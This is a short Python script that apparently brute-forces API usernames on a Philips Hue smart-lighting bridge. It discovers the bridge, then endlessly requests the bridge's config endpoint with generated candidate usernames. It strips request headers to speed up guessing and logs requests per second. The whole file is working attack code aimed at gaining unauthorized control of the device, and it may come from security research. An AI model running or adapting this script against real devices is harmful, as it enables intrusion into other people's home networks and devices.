from pprint import pprint
import string
import random
import time
import string

# monkeypatch requests
import utils

import requests

import discover
import users

s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = discover.find_hue()

prefix = users.USERNAME_PREFIX

count = 0
start_time = time.time()
interval = start_time
while True:
    # shuffle the charset, but cycle every guess before repeating
    for next_guess in users.charset():
        username = users.generate_username(prefix + next_guess)
        res = s.get(hue_url + 'api/{}/config'.format(username))
        #pprint(res.json())
        count += 1
        if count % 100 == 0:
            now = time.time()
            elapsed = now - start_time
            print count, elapsed, 100 / (now - interval)
            interval = now
#        time.sleep(0.01)
